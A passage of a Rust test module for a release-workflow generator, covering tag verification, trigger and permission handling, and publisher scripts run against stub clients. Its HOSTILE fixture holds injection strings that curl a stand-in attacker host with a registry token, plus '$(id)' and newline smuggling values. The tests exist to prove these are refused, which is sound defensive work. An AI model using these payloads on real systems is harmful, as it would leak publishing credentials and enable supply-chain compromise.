            creation["env"]["GH_REPO"].as_str(),
            Some("${{ github.repository }}"),
            "the creation step states the repository the draft lands in"
        );
    }

    // The tag must already exist on the remote for the draft to attach to the
    // release this transition published. Without `--verify-tag`, `gh release
    // create` against a missing tag does not fail: it creates the tag at the
    // default-branch head, and the Release is attached to a tag Intentional
    // never made and never verified. The ordering test proves the template
    // orders the two steps; this is the half that proves it on the runner, so
    // it is asserted on the invocation the step actually made.
    #[test]
    fn creates_the_draft_only_against_a_tag_the_remote_already_carries() {
        let workspace = workspace("workflow-draft-creation-tag-verified");
        converge(workspace.root(), WorkflowRole::Release);

        let (created, invocations) =
            run_draft_creation(workspace.root(), &gh_stub(GH_RELEASE_ABSENT));
        assert!(created, "the draft is created: {invocations}");
        let creation = invocations
            .lines()
            .find(|line| line.contains("release create"))
            .expect("the step creates the Release");
        assert!(
            creation.contains("--verify-tag"),
            "creation refuses a tag the remote does not carry: {creation}"
        );
    }

    // `gh release view` fails for a Release that does not exist and equally for
    // a rate limit, a 5xx, or a revoked token. Reading every failure as absence
    // turns the one case create-if-absent exists to serve -- a rerun where the
    // draft does exist -- into a hard failure reported as a tag collision. The
    // step is executed because the difference is entirely in what the failing
    // command said, which no reading of the template can show.
    #[test]
    fn refuses_a_release_state_it_could_not_resolve_rather_than_assuming_absence() {
        let workspace = workspace("workflow-draft-creation-unresolved");
        converge(workspace.root(), WorkflowRole::Release);

        let (continued, invocations) =
            run_draft_creation(workspace.root(), &gh_stub(GH_RELEASE_UNRESOLVED));
        assert!(
            !continued,
            "an unresolved Release state stops the transition: {invocations}"
        );
        assert!(
            !invocations.contains("release create"),
            "an unresolved Release state is not treated as absence: {invocations}"
        );
    }

    // The other existing-Release case is not resumable. A Release that is no
    // longer a draft has already been closed and frozen, so continuing would
    // carry the transition on toward publishers that upload onto an immutable
    // Release. Refusing here is what keeps create-if-absent from meaning
    // continue-regardless.
    #[test]
    fn refuses_to_continue_when_the_release_for_the_tag_is_already_published() {
        let workspace = workspace("workflow-draft-creation-published");
        converge(workspace.root(), WorkflowRole::Release);

        let (continued, invocations) =
            run_draft_creation(workspace.root(), &gh_stub("    printf 'false\\n'"));
        assert!(
            !continued,
            "the transition refuses a Release that is no longer a draft: {invocations}"
        );
    }

    #[test]
    fn proves_shorthand_triggers_survive_their_expansion() {
        let workspace = workspace("workflow-shorthand-proof");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non: [ push, issues ]\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let config = Config::load(workspace.root()).expect("config loads");
        let namespaces = config
            .github
            .as_ref()
            .expect("github config")
            .namespaces()
            .expect("namespaces");
        let contract = release_contract(&namespaces, &[]).expect("contract derives");
        let text = std::fs::read_to_string(workspace.root().join(".github/workflows/release.yml"))
            .expect("workflow readable");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");
        let parsed: Value = serde_yaml::from_str(&output).expect("output parses");

        // The comparison runs against the expanded form, so a defect that drops
        // a shorthand trigger is refused rather than passing unnoticed.
        let expanded: Value =
            serde_yaml::from_str("on:\n  push:\n  issues:\n").expect("expanded input");
        preserves_repository_content(&expanded, &parsed, &contract)
            .expect("every shorthand trigger survives expansion");
        let mut damaged = parsed.clone();
        damaged["on"]
            .as_mapping_mut()
            .expect("triggers")
            .remove(Value::String("issues".to_owned()));
        let diagnostic = preserves_repository_content(&expanded, &damaged, &contract)
            .expect_err("a dropped shorthand trigger is refused");
        assert_eq!(diagnostic.path.as_deref(), Some("on.issues"));
    }

    #[test]
    fn expands_shorthand_triggers_instead_of_discarding_them() {
        let workspace = workspace("workflow-shorthand");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non: [ push, issues ]\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Release);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Release))
                .expect("result parses");
        let triggers = document["on"].as_mapping().expect("trigger mapping");
        for trigger in ["push", "issues", "workflow_dispatch"] {
            assert!(
                triggers.contains_key(Value::String(trigger.to_owned())),
                "{trigger} survives shorthand expansion: {triggers:?}"
            );
        }
    }

    #[test]
    fn states_the_release_tag_requirement_in_every_managed_checkout() {
        let workspace = workspace("workflow-fetch-tags");
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            let document: Value =
                serde_yaml::from_str(&workflow(workspace.root(), role)).expect("result parses");
            let jobs = document["jobs"].as_mapping().expect("jobs");
            let mut checkouts = 0;
            for (id, body) in jobs {
                let Some(id) = id.as_str().filter(|id| id.starts_with("intentional_")) else {
                    continue;
                };
                for step in body["steps"].as_sequence().expect("steps") {
                    if step
                        .get("uses")
                        .and_then(Value::as_str)
                        .is_some_and(|uses| uses.starts_with("actions/checkout@"))
                    {
                        checkouts += 1;
                        assert_eq!(
                            step["with"]["fetch-tags"].as_bool(),
                            Some(true),
                            "{id} states its release-tag requirement rather than inheriting it"
                        );
                    }
                }
            }
            assert!(
                checkouts > 0,
                "the {role} workflow checks out in managed jobs"
            );
        }
    }

    #[test]
    fn reports_the_permission_scopes_the_safe_default_drops() {
        let workspace = workspace("workflow-permissions");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  workflow_dispatch:\npermissions:\n  contents: read\n  id-token: write\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Different);
        let advisory = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "permissions-narrowed")
            .expect("the dropped scope is reported before the user applies it");
        assert!(
            advisory.message.contains("id-token: write"),
            "the advisory names the dropped scope: {}",
            advisory.message
        );
        assert_eq!(advisory.path.as_deref(), Some("permissions"));

        // An already-safe default is left alone and reported as nothing.
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  workflow_dispatch:\npermissions:\n  contents: read\n  actions: read\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert!(
            comparison.diagnostics.is_empty(),
            "a read-only default is preserved without comment: {:?}",
            comparison.diagnostics
        );
    }

    #[test]
    fn refuses_a_transformation_that_does_not_carry_the_contract() {
        let workspace = workspace("workflow-postcondition");
        let config = Config::load(workspace.root()).expect("config loads");
        let namespaces = config
            .github
            .as_ref()
            .expect("github config")
            .namespaces()
            .expect("namespaces");
        let contract = release_contract(&namespaces, &[]).expect("contract derives");
        let text = std::fs::read_to_string(workspace.root().join(".github/workflows/release.yml"))
            .expect("workflow readable");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");

        let mut parsed: Value = serde_yaml::from_str(&output).expect("output parses");
        carries_contract(&parsed, &contract).expect("the real transformation carries the contract");

        // A splicer defect that emits well-formed YAML in the wrong place looks
        // exactly like this to the post-condition.
        parsed["jobs"]
            .as_mapping_mut()
            .expect("jobs mapping")
            .remove(Value::String("intentional_prepare".to_owned()));
        let diagnostic =
            carries_contract(&parsed, &contract).expect_err("a missing managed job is refused");
        assert_eq!(diagnostic.code, "transformation-invalid");
        assert_eq!(diagnostic.path.as_deref(), Some("jobs.intentional_prepare"));
    }

    #[test]
    fn refuses_a_transformation_that_discards_repository_owned_content() {
        let workspace = workspace("workflow-preservation");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  workflow_dispatch:\n  schedule:\n    - cron: '0 0 * * *'\nenv:\n  REPOSITORY_SETTING: kept\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let config = Config::load(workspace.root()).expect("config loads");
        let namespaces = config
            .github
            .as_ref()
            .expect("github config")
            .namespaces()
            .expect("namespaces");
        let contract = release_contract(&namespaces, &["candidate_check".to_owned()])
            .expect("contract derives");
        let text = std::fs::read_to_string(workspace.root().join(".github/workflows/release.yml"))
            .expect("workflow readable");
        let input: Value = serde_yaml::from_str(&text).expect("input parses");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");
        let parsed: Value = serde_yaml::from_str(&output).expect("output parses");
        preserves_repository_content(&input, &parsed, &contract)
            .expect("the real transformation preserves repository content");

        // Each of these is what a splice that damaged only repository-owned
        // content would look like; the contract check cannot see any of them.
        for (location, damage) in [
            ("jobs.candidate_check", "jobs"),
            ("on.schedule", "on"),
            ("env", "env"),
        ] {
            let mut damaged = parsed.clone();
            let mapping = damaged.as_mapping_mut().expect("top level");
            if damage == "env" {
                mapping.remove(Value::String("env".to_owned()));
            } else {
                let key = location.split('.').nth(1).expect("damaged key");
                mapping[&Value::String(damage.to_owned())]
                    .as_mapping_mut()
                    .expect("container")
                    .remove(Value::String(key.to_owned()));
            }
            let diagnostic = preserves_repository_content(&input, &damaged, &contract)
                .expect_err("discarded repository content is refused");
            assert_eq!(diagnostic.code, "transformation-invalid");
            assert_eq!(diagnostic.path.as_deref(), Some(location));
        }

        // A reserved job is Intentional's to retire, so removing one is not a
        // loss of repository-owned content.
        let mut retired = parsed.clone();
        retired["jobs"]
            .as_mapping_mut()
            .expect("jobs")
            .remove(Value::String("intentional_prepare".to_owned()));
        preserves_repository_content(&input, &retired, &contract)
            .expect("retiring a reserved job is not repository-content loss");
    }

    #[test]
    fn orders_closure_after_tag_verification_without_any_publication() {
        let workspace = workspace("workflow-zero-publications");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace("    cargo: {}\n", ""),
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");
        let jobs = document["jobs"].as_mapping().expect("jobs");

        let needs = |id: &str| {
            jobs[&Value::String(id.to_owned())]["needs"]
                .as_sequence()
                .expect("needs")
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect::<Vec<_>>()
        };
        assert!(
            needs("intentional_assemble_evidence").contains(&"intentional_verify_tag".to_owned()),
            "tag verification dominates the graph even with no publication to publish"
        );
        assert!(
            needs("intentional_close_release")
                .contains(&"intentional_assemble_evidence".to_owned()),
            "closure stays downstream of assembly"
        );
        assert!(
            needs("intentional_assemble_evidence").contains(&"artifact_check".to_owned()),
            "the configured publish gate precedes assembly"
        );
    }

    #[test]
    fn blocks_publication_without_a_configured_global_release_tag() {
        let workspace = workspace("workflow-no-tag");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "workspace-tags:\n  release:\n    template: '{version}'\n",
                "",
            ),
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "release-tag-undefined");
        assert!(comparison.output_digest.is_none());
    }

    #[test]
    fn blocks_when_two_publications_claim_one_managed_job_identifier() {
        let workspace = workspace("workflow-collision");
        workspace
            .write(
                ".intentional/config.yml",
                &CONFIG.replace(
                    "release-units:\n  component:\n",
                    "release-units:\n  component.one:\n    path: one\n    cargo: {}\n    tags:\n      primary: { role: primary, template: 'one@{version}', require-phase: after-publication }\n  component_one:\n",
                ),
            )
            .write(
                "one/Cargo.toml",
                "[package]\nname = \"example-one\"\nversion = \"1.0.0\"\n",
            );
        std::fs::rename(
            workspace.root().join("component"),
            workspace.root().join("component_one"),
        )
        .ok();
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "job-identifier-collision");
    }

    /// A workspace publishing one npm package to both of its destinations.
    ///
    /// The npm adapter is the only one whose two destinations differ in what
    /// they will accept — one serves anonymous clients and implements trusted
    /// publishing, the other serves neither — so it is the workspace every
    /// per-destination property is asserted against.
    fn npm_workspace(label: &str) -> Workspace {
        let workspace = workspace(label);
        workspace
            .write(
                ".intentional/config.yml",
                &CONFIG.replace(
                    "    cargo: {}\n",
                    "    npm: { additional-targets: { github: {} } }\n",
                ),
            )
            .write(
                "component/package.json",
                r#"{"name":"@example-owner/example-component","version":"1.0.0"}"#,
            );
        std::fs::remove_file(workspace.root().join("component/Cargo.toml")).expect("remove");
        workspace
    }

    /// Steps of one managed publisher job, by publication identity fragment.
    fn publisher_steps(root: &Path, target: &str) -> Vec<Value> {
        managed_steps(root, WorkflowRole::Publish)
            .into_iter()
            .find(|(id, _)| id.ends_with(target))
            .unwrap_or_else(|| panic!("a publisher job for {target} is derived"))
            .1
    }

    /// One step's `env:` mapping, as plain strings.
    fn step_environment(step: &Value) -> BTreeMap<String, String> {
        step.get("env")
            .and_then(Value::as_mapping)
            .map(|env| {
                env.iter()
                    .filter_map(|(key, value)| {
                        Some((key.as_str()?.to_owned(), value.as_str()?.to_owned()))
                    })
                    .collect()
            })
            .unwrap_or_default()
    }

    // A recipe's readback writes the observation and the portable command reads
    // it, and the two agree only by path. Before the recipes existed nothing
    // wrote one at all: `verify publication` was handed a path that never came
    // into being, waited out its whole consistency deadline reading a file that
    // was not there, and failed as "pending" -- a diagnostic naming the
    // destination rather than the missing producer. Naming the file in two
    // places is exactly the shape the artifact binding above exists to stop, so
    // it is asserted for the observation too.
    #[test]
    fn binds_every_observation_a_publisher_verifies_to_the_step_that_writes_it() {
        for (workspace, targets) in [
            (workspace("workflow-observation-cargo"), &["primary"][..]),
            (
                npm_workspace("workflow-observation-npm"),
                &["primary", "github"][..],
            ),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            for target in targets {
                let steps = publisher_steps(workspace.root(), target);
                let verified = steps
                    .iter()
                    .find_map(|step| {
                        let (name, _) = intentional_action(step)?;
                        (name == "verify-publication").then(|| {
                            step["with"]["observation"]
                                .as_str()
                                .expect("path")
                                .to_owned()
                        })
                    })
                    .expect("the publisher verifies its publication");
                let writers = steps
                    .iter()
                    .filter(|step| {
                        step_environment(step)
                            .get("INTENTIONAL_OBSERVATION")
                            .is_some_and(|path| path == &verified)
                            && step.get("run").and_then(Value::as_str).is_some_and(|body| {
                                body.contains("> \"${INTENTIONAL_OBSERVATION}\"")
                            })
                    })
                    .count();
                assert_eq!(
                    writers, 1,
                    "exactly one step of the {target} publisher writes the observation {verified} that its verification reads"
                );
            }
        }
    }

    // Every observation a recipe writes is written by shell. A misspelled
    // member, a state carrying detail it may not carry, or a schema identity
    // edited in one copy and not another is a defect nothing in a Rust test
    // would see and that a release runner would surface three jobs later, as a
    // verification failure naming the destination rather than the recipe. The
    // helpers are therefore executed and what they wrote is loaded by the same
    // loader the command uses.
    //
    // All three documents are driven, and the present one matters most: it
    // carries the subject, packager, destination and retrieval -- every
    // affirmative claim the fragment is built from. An earlier version of this
    // test ran only the two states that carry no detail, and two mutations in
    // the present path survived the whole suite green.
    #[test]
    fn writes_every_observation_state_in_a_form_the_loader_accepts() {
        for (workspace, publisher) in [
            (workspace("workflow-observed-states-cargo"), "cargo"),
            (npm_workspace("workflow-observed-states-npm"), "npm"),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let readback = publisher_steps(workspace.root(), PRIMARY_TARGET)
                .into_iter()
                .find(|step| step_environment(step).contains_key("INTENTIONAL_OBSERVATION"))
                .expect("the recipe writes an observation");
            let environment = step_environment(&readback);
            let body = readback["run"].as_str().expect("a script");
            let helpers = observation_helpers(body);

            let temporary = workspace.root().join("runner");
            std::fs::create_dir_all(&temporary).expect("runner directory");
            let resolve =
                |value: &str| value.replace("${{ runner.temp }}", &temporary.display().to_string());
            // Everything the adapter script computes before it writes a present
            // observation reaches the helper as a shell variable, so the
            // document can be driven without reaching a registry. These stand
            // in for exactly those values.
            let computed = [
                ("INTENTIONAL_VERSION", "1.0.0"),
                (
                    "INTENTIONAL_SUBJECT_DIGEST",
                    "sha256:1111111111111111111111111111111111111111111111111111111111111111",
                ),
                ("INTENTIONAL_PACKAGER_VERSION", "1.2.3"),
                ("INTENTIONAL_DESTINATION_DIGEST", "a-destination-checksum"),
                ("INTENTIONAL_RETRIEVAL_VERSION", "1.2.3"),
                ("INTENTIONAL_RETRIEVED_DIGEST", "a-destination-checksum"),
            ];

            for (state, call) in [
                (
                    ObservationState::Pending,
                    "INTENTIONAL_observe_state pending",
                ),
                (
                    ObservationState::Conflict,
                    "INTENTIONAL_observe_state conflict \"another release holds this version\"",
                ),
                (ObservationState::Present, "INTENTIONAL_observe_present"),
            ] {
                let mut command = std::process::Command::new("bash");
                command.arg("-c").arg(format!("{helpers}\n{call}"));
                for (key, value) in &environment {
                    command.env(key, resolve(value));
                }
                for (key, value) in computed {
                    command.env(key, value);
                }
                let output = command.output().expect("the recipe script runs");
                assert!(
                    output.status.success(),
                    "{publisher} writes a {state} observation: {}",
                    String::from_utf8_lossy(&output.stderr)
                );

                let path = resolve(&environment["INTENTIONAL_OBSERVATION"]);
                let observed =
                    crate::publication::observation::PublicationObservation::load(Path::new(&path))
                        .unwrap_or_else(|error| {
                            panic!("{publisher} writes a loadable {state} observation: {error}")
                        });
                assert_eq!(observed.state, state);
                assert_eq!(
                    observed.identity(),
                    format!("component/{publisher}/{PRIMARY_TARGET}"),
                    "the observation names the publication its job publishes"
                );
                if state != ObservationState::Present {
                    continue;
                }
                let retrieval = observed.retrieval.expect("a present observation retrieves");
                assert_eq!(
                    retrieval.mode,
                    CleanClientMode::Public,
                    "the present document records the mode its recipe fixes"
                );
                let subject = observed
                    .subject
                    .expect("a present observation has a subject");
                assert_eq!(subject.version, "1.0.0");
                assert_eq!(
                    observed
                        .destination
                        .expect("a present observation reads back")
                        .digest,
                    "a-destination-checksum"
                );
            }
        }
    }

    /// The observation helpers one derived recipe script defines, and nothing else.
    ///
    /// Running any more of the script would reach a registry. The block ends at
    /// the last helper's closing brace, which the re-emitted block scalar puts
    /// in the first column; slicing at the first one instead would stop after
    /// the header helper and cover neither state.
    fn observation_helpers(body: &str) -> &str {
        let present = body
            .find("INTENTIONAL_observe_present() {")
            .expect("the recipe defines the present-observation helper");
        let end = body[present..]
            .find("\n}\n")
            .expect("the present-observation helper is a shell function");
        &body[..present + end + "\n}\n".len()]
    }

    // Everything the observation says about the release comes from the build
    // job, which derived it from the verified global release tag and from the
    // bytes it emitted. A recipe that read its own package manifest instead
    // would publish whatever that manifest said and record it as agreement,
    // which is the one disagreement the sealed subject exists to catch.
    #[test]
    fn reads_every_published_subject_fact_from_the_job_that_built_it() {
        let workspace = npm_workspace("workflow-subject-facts");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let build = "intentional_build_component_npm";
        let outputs = jobs[&Value::String(build.to_owned())]["outputs"]
            .as_mapping()
            .expect("the build job projects what it recorded")
            .iter()
            .filter_map(|(key, value)| Some((key.as_str()?.to_owned(), value.as_str()?.to_owned())))
            .collect::<BTreeMap<_, _>>();
        let recorder = managed_steps(workspace.root(), WorkflowRole::Publish)
            .into_iter()
            .find(|(id, _)| id == build)
            .expect("the build job is derived")
            .1
            .iter()
            .find_map(|step| {
                let (name, _) = intentional_action(step)?;
                (name == "record-built-subject")
                    .then(|| step["id"].as_str().expect("addressable").to_owned())
            })
            .expect("the build job records its subject through the Action");
        for key in ["version", "digest"] {
            assert_eq!(
                outputs.get(key).map(String::as_str),
                Some(format!("${{{{ steps.{recorder}.outputs.{key} }}}}").as_str()),
                "the build job projects the {key} the recording step derived"
            );
            assert!(
                action_outputs("record-built-subject").contains(key),
                "the record-built-subject Action declares {key}"
            );
        }

        for target in ["primary", "github"] {
            for step in publisher_steps(workspace.root(), target) {
                let environment = step_environment(&step);
                for (variable, key) in [
                    ("INTENTIONAL_VERSION", "version"),
                    ("INTENTIONAL_SUBJECT_DIGEST", "digest"),
                ] {
                    let Some(value) = environment.get(variable) else {
                        continue;
                    };
                    assert_eq!(
                        value,
                        &format!("${{{{ needs.{build}.outputs.{key} }}}}"),
                        "the {target} publisher reads the subject {key} from {build}"
                    );
                }
            }
        }
    }

    // A `${{ }}` expansion inside a `run:` body is textual substitution into
    // shell source before the shell ever runs, so a value carrying a quote or a
    // `$(...)` becomes executable text. These bodies hold registry credentials
    // and run in a job that later reaches the publication protocol, and the
    // same rule is already gated for the composite Actions this repository
    // publishes; the derived workflows were the surface it did not cover.
    #[test]
    fn routes_every_value_a_managed_script_reads_through_its_environment() {
        for workspace in [
            workspace("workflow-expansion-cargo"),
            npm_workspace("workflow-expansion-npm"),
            two_destination_workspace("workflow-expansion-oci"),
        ] {
            for role in WorkflowRole::ALL {
                converge(workspace.root(), role);
                for (id, steps) in managed_steps(workspace.root(), role) {
                    for step in &steps {
                        let body = step.get("run").and_then(Value::as_str).unwrap_or_default();
                        assert!(
                            !body.contains("${{"),
                            "{id} expands a workflow expression inside a run body: {body}"
                        );
                    }
                }
            }
        }
    }

    // A published version is immutable, so a rerun after a partial failure has
    // exactly one safe move: read the destination, and submit only where it can
    // establish that it did not accept the original operation. A script that
    // published first would turn every rerun into a terminal conflict at a
    // destination that already held the right bytes. Ordering inside the script
    // is where that lives, so it is asserted by relative position.
    #[test]
    fn reads_each_destination_before_submitting_anything_to_it() {
        for (workspace, submission) in [
            (workspace("workflow-rerun-cargo"), "cargo publish"),
            (npm_workspace("workflow-rerun-npm"), "npm publish"),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let publishers = managed_steps(workspace.root(), WorkflowRole::Publish)
                .into_iter()
                .filter(|(id, _)| id.starts_with("intentional_publish_"))
                .collect::<Vec<_>>();
            assert!(!publishers.is_empty(), "the workspace derives publishers");
            for (target, steps) in publishers {
                let step = steps
                    .into_iter()
                    .find(|step| {
                        step.get("run")
                            .and_then(Value::as_str)
                            .is_some_and(|body| body.contains(submission))
                    })
                    .unwrap_or_else(|| panic!("{target} submits its subject with {submission}"));
                let body = step["run"].as_str().expect("a script");
                let read = body
                    .find("the readback decides whether it is this release")
                    .expect("the script short-circuits on a version the destination already holds");
                let submit = body
                    .find(submission)
                    .expect("the script submits the promoted subject");
                assert!(
                    read < submit,
                    "the {target} publisher reads its destination before submitting to it"
                );
            }
        }
    }

    /// The one command a stub cargo has to actually perform.
    ///
    /// The probe creates its scratch crate and then works inside it, so a stub
    /// that no-ops `cargo new` leaves the script with nowhere to go and the
    /// failure looks like a classification rather than a missing directory.
    const CARGO_NEW: &str = "case \"$1\" in new) mkdir -p \"${@: -1}\"; exit 0 ;; esac\n";

    /// A directory holding one stub client that answers a scripted way.
    ///
    /// The recipes decide whether to reach a long-lived credential from what a
    /// registry client tells them, and the three answers that matter differ
    /// only in an exit status and a line of output. Asserting the decision
    /// therefore means running the script against a client that gives each
    /// answer, which is what this builds.
    fn stub_client(directory: &Path, client: &str, script: &str) -> PathBuf {
        let path = directory.join(client);
        std::fs::create_dir_all(directory).expect("stub directory");
        // Every stub writes to standard error on every call, including the
        // calls that succeed. Real clients do: npm emits warnings, notices and
        // its update notice there routinely. A silent stub is what let a helper
        // that merged the two streams pass -- the merged value was only ever
        // exercised against a client that had nothing to say.
        // The stub records beside itself rather than through a variable the
        // harness sets. A probe that is given an allowlisted environment does
        // not carry the harness's variables into the client, and a stub that
        // needed one would go silent exactly when the allowlist started
        // working -- which is a stub reporting on the harness rather than on
        // the derivation.
        std::fs::write(
            &path,
            format!(
                "#!/usr/bin/env bash\n@ARGUMENTS@\n@ENVIRONMENT@\necho '{client} warn Unknown env config \"registry-scope\"' >&2\n{script}\nexit 0\n"
            )
            .replace(
                "@ARGUMENTS@",
                &format!(
                    "printf '%s\\n' \"$*\" >> \"{}\"",
                    directory.join("calls.log").display()
                ),
            )
            .replace(
                "@ENVIRONMENT@",
                &format!("env >> \"{}\"", directory.join("env.log").display()),
            ),
        )
        .expect("stub written");
        let mut permissions = std::fs::metadata(&path)
            .expect("stub metadata")
            .permissions();
        std::os::unix::fs::PermissionsExt::set_mode(&mut permissions, 0o755);
        std::fs::set_permissions(&path, permissions).expect("stub is executable");
        directory.to_path_buf()
    }

    /// Everything one stub client was called with, one invocation per line.
    fn stub_calls(stubs: &Path) -> String {
        std::fs::read_to_string(stubs.join("calls.log")).unwrap_or_default()
    }

    /// Every environment one stub client was invoked in.
    fn stub_environment(stubs: &Path) -> String {
        std::fs::read_to_string(stubs.join("env.log")).unwrap_or_default()
    }

    /// Run one derived step's script with a stub client ahead of it on PATH.
    fn run_step(
        step: &Value,
        stubs: &Path,
        temporary: &Path,
        extra: &[(&str, &str)],
    ) -> (bool, String) {
        let mut command = std::process::Command::new("bash");
        command
            .arg("-c")
            .arg(step["run"].as_str().expect("a script"))
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    stubs.display(),
                    std::env::var("PATH").unwrap_or_default()
                ),
            )
            .env("HOME", temporary)
            .env("RUNNER_TEMP", temporary)
            .env("GITHUB_WORKSPACE", temporary)
            .env("GITHUB_ENV", temporary.join("github.env"));
        for (key, value) in step_environment(step) {
            command.env(
                key,
                value.replace("${{ runner.temp }}", &temporary.display().to_string()),
            );
        }
        for (key, value) in extra {
            command.env(key, value);
        }
        let output = command.output().expect("the derived script runs");
        (output.status.success(), stub_calls(stubs))
    }

    /// Every value a maintained recipe reads out of the repository it releases.
    ///
    /// This is the list the boundary rule is written against, so it is written
    /// down rather than inferred: each entry is a place a repository author
    /// types a name that derivation then puts into a script, a document or a
    /// command line. Fixing one of them per sink is what let the first
    /// injection be closed for the registry name while the package name walked
    /// through the same gap into a `sed` address; the answer is to hold every
    /// entry to the same rule and to keep the list where a new entry has to
    /// join it.
    const REPOSITORY_SUPPLIED: [(&str, &str, &str); 6] = [
        (
            "component/Cargo.toml",
            "[package]\nname = \"@VALUE@\"\nversion = \"1.0.0\"\n",
            "subject-identity-invalid",
        ),
        (
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"@VALUE@\"]\n",
            "recipe-underivable",
        ),
        (
            "component/package.json",
            r#"{"name":"@VALUE@","version":"1.0.0"}"#,
            "subject-identity-invalid",
        ),
        (
            ".intentional/config.yml",
            "@RELEASE_UNIT@",
            "subject-identity-invalid",
        ),
        (
            ".intentional/config.yml",
            "@TOKEN_SECRET@",
            "recipe-underivable",
        ),
        (
            ".cargo/config.toml",
            "[registries.example-registry]\nindex = \"@VALUE@\"\n",
            "recipe-underivable",
        ),
    ];

    /// Values the workspace admits and the publication boundary must refuse.
    ///
    /// The hostile shapes below are refused by the configuration loader long
    /// before derivation, so a roster entry driven only by them proves nothing
    /// about the boundary: the entry passes with the boundary's own validator
    /// deleted. These are the shapes that reach it -- legal workspace
    /// identifiers whose punctuation a recipe's sinks cannot carry.
    const NARROWED: [&str; 2] = ["example-owner/component", "-rf"];

    /// Values that are executable text, or that reshape a document, at a sink.
    ///
    /// The first two are the review's own reproductions, kept verbatim. The
    /// `sed` one is the sharp case: it is correctly `env:`-routed and correctly
    /// quoted, and GNU `sed`'s `e` command executes it anyway, because quoting
    /// a value into a shell command does not stop the command from
    /// interpreting it.
    const HOSTILE: [&str; 4] = [
        r#"a\"$/e echo PWNED; sh -c 'curl http://attacker.example/$CARGO_REGISTRY_TOKEN' #"#,
        "a\"; curl http://attacker.example/$CARGO_REGISTRY_TOKEN; #",
        "a\nname",
        "a$(id)",
    ];

    /// A workspace whose every repository-supplied value is distinctive.
    ///
    /// Each value below is one an author types and derivation then carries into
    /// a workflow. They are legal names, deliberately: the boundary refuses the
    /// hostile ones, and this fixture is about where the accepted ones end up.
    fn sentinel_workspace(label: &str, prefix: Option<&str>) -> Workspace {
        let workspace = Workspace::new(label);
        let configured = prefix.map_or_else(String::new, |prefix| format!("  prefix: {prefix}\n"));
        workspace
            .write(
                ".intentional/config.yml",
                &SENTINEL_CONFIG.replace("@PREFIX@\n", &configured),
            )
            .write(
                ".cargo/config.toml",
                "[registries.mtdlgw]\nindex = \"sparse+https://jvnqsx.example/idx/\"\n",
            )
            .write(
                "vkjmtd/package.json",
                r#"{"name":"@kfnrbg/pxwqld","version":"1.0.0"}"#,
            )
            .write(
                "bgqnwt/Dockerfile",
                "FROM scratch\nLABEL org.opencontainers.image.title=\"gwlqcx\"\n",
            )
            .write(
                "kdshpm/devcontainer-feature.json",
                r#"{"id":"nfxkbd","version":"1.0.0"}"#,
            )
            .write(
                "vkjmtd/Cargo.toml",
                "[package]\nname = \"hbzqvn\"\nversion = \"1.0.0\"\npublish = [\"mtdlgw\"]\n",
            )
            .write(".github/workflows/release.yml", REPOSITORY_RELEASE_WORKFLOW)
            .write(".github/workflows/publish.yml", REPOSITORY_PUBLISH_WORKFLOW);
        workspace
    }

    /// Configuration whose every author-typed value is distinctive.
    const SENTINEL_CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-1
workspace-tags:
  release:
    template: 'tzbrmk{version}dnwlpq'
github:
@PREFIX@
  workflows:
    release: { path: .github/workflows/release.yml }
    publish: { path: .github/workflows/publish.yml }
release-units:
  jdmcvx:
    path: bgqnwt
    oci:
      dockerhub:
        repository: zrpvhm/phqvrb
        username-var: KLXVBRQ
        token-secret: WZDNGPT
      ghcr:
        repository: mwbqjt/nkwzdt
        omit: [ signature ]
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
  rtwzlf:
    path: kdshpm
    oci:
      ghcr: {}
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
  qhwzru:
    path: vkjmtd
    npm:
